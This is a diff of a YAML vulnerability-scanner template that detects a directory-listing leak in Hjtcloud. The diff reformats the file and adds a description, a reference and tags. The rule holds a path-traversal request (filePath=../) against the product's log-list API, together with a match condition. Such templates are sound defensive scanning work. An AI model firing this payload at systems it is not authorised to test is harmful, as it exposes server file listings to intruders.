@@ -1,16 +1,21 @@
 id: hjtcloud-directory-file-leak
 
 info:
-    name: Hjtcloud Directory File Leak
-    author: YekkoY
-    severity: high
-    verified: false
+  name: Hjtcloud Directory File Leak
+  author: YekkoY
+  severity: high
+  verified: false
+  description: |-
+    Hjtcloud 存在目录浏览漏洞。
+  reference:
+    - https://www.seebug.org/vuldb/ssvid-91762
+  tags: hjtcloud,disclosure
+  created: 2023/10/29
 
 rules:
-    r0:
-        request:
-            method: GET
-            path: /him/api/rest/V1.0/system/log/list?filePath=../
-        expression: response.status == 200 && response.content_type.contains("application/json") && response.body.bcontains(b"\"absolutePath\":\"/var/logs/")
+  r0:
+    request:
+      method: GET
+      path: /him/api/rest/V1.0/system/log/list?filePath=../
+    expression: response.status == 200 && response.content_type.contains("application/json") && response.body.bcontains(b"\"absolutePath\":\"/var/logs/")
 expression: r0()
-
